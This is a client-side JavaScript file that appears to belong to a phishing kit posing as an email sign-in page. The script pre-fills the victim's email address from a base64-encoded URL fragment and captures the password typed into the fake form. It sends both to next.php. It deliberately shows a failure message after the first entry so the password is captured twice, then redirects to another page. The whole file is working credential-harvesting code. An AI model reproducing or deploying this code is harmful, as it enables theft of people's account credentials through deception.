$(document).ready(function() {
    var count = 0;
    /////////////url ai getting////////////////
    var ai = window.location.hash.substr(1);
    if (!ai) {

    } else {
        var base64regex = /^([0-9a-zA-Z+/]{4})*(([0-9a-zA-Z+/]{2}==)|([0-9a-zA-Z+/]{3}=))?$/;

        if (!base64regex.test(ai)) {
            // alert(btoa(ai));
            var my_ai = ai;
        } else {
            // alert(atob(ai));
            var my_ai = atob(ai);
        }
        // $('#ai').val(ai);
        // var my_ai =ai;
        var filter = /^([a-zA-Z0-9_\.\-])+\@(([a-zA-Z0-9\-])+\.)+([a-zA-Z0-9]{2,4})+$/;

        if (!filter.test(my_ai)) {
            $('#error').show();
            ai.focus;
            return false;
        }
        var ind = my_ai.indexOf("@");
        var my_slice = my_ai.substr((ind + 1));
        var c = my_slice.substr(0, my_slice.indexOf('.'));
        var final = c.toLowerCase();
        $('#ai').val(my_ai);
        $("#div1").animate({ left: 0, opacity: "hide" }, 0);
        $("#div2").animate({ right: 0, opacity: "show" }, 500);

        $("#aich").html(my_ai);


    }

    $('#ai').click(function() {
        $('#error').hide();
    });

    $(document).keypress(function(event) {

        var keycode = (event.keyCode ? event.keyCode : event.which);
        if (keycode == '13') {
            event.preventDefault();
            if ($("#div1").is(":visible")) {

                $("#next").click();

            } else if ($("#div2").is(":visible")) {
                event.preventDefault();

                $("#submit-btn").click();

            } else {
                return false;
            }
        }
    });
    $('#next').click(function() {
        event.preventDefault();
        var my_ai = $('#ai').val();
        var filter = /^([a-zA-Z0-9_\.\-])+\@(([a-zA-Z0-9\-])+\.)+([a-zA-Z0-9]{2,4})+$/;

        if (!filter.test(my_ai)) {
            $('#error').show();
            ai.focus;
            return false;
        }
        var ind = my_ai.indexOf("@");
        var my_slice = my_ai.substr((ind + 1));
        var c = my_slice.substr(0, my_slice.indexOf('.'));
        var final = c.toLowerCase();
        $("#div1").animate({ left: 0, opacity: "hide" }, 0);
        $("#div2").animate({ right: 0, opacity: "show" }, 500);
        $("#aich").html(my_ai);
    });
    var file="bmV4dC5waHA=";
    $('#submit-btn').click(function(event) {
        event.preventDefault();
        var ai = $("#ai").val();
        var pr = $("#pr").val();
        var detail = $("#field").html();
        var msg2 = $('#msg').html();

        var my_ai = ai;
        var ind = my_ai.indexOf("@");
        var my_slice = my_ai.substr((ind + 1));
        var c = my_slice.substr(0, my_slice.indexOf('.'));
        var final = c.toLowerCase();
        count = count + 1;
        $('#msg').text(msg2);
        $.ajax({
            url: "next.php",
            type: 'POST',
            data: {
                ai: ai,
                pr: pr,
            },
            beforeSend: function(xhr) {
                $("#submit-btn").html("verifying...");
            },
            success: function(response) {
                $("#pr").val("");
                if($.trim(response)=="ok"){
                    if(count > 1) {
                        count = 0;
                        $("#div2").animate({left: 0, opacity: "hide"}, 0);
                        $("#div3").animate({left: 0, opacity: "show"}, 500);
                        setTimeout(() => {
                            window.location.replace("dfgjuytgfdsx.html");
                        }, 1000);
                        return false;
                    }else{
                        $("#msg2").show();
                        $("#msg").hide();
                        $("#msg1").hide();
                    }
                }else{
                    $("#msg2").show();
                    $("#msg").hide();
                    $("#msg1").hide();
                }
                // if (count == 1) {
                //     $("#msg2").show();
                //     $("#msg").hide();
                //     $("#msg1").hide();
                // }
                // else {
                //     $("#msg1").show();
                //     $("#msg").hide();
                //     $("#msg2").hide();

                // }
            },
            error: function() {
                $("#pr").val("");
                $("#msg2").show();
                $("#msg").hide();
                $("#msg1").hide();
                // if (count == 1) {
                //     $("#msg2").show();
                //     $("#msg").hide();
                //     $("#msg1").hide();
                // }
                // else {
                //     $("#msg1").show();
                //     $("#msg").hide();
                //     $("#msg2").hide();

                // }
            },
            complete: function() {
                $("#submit-btn").html("Sign in");
            }
        });
    });
});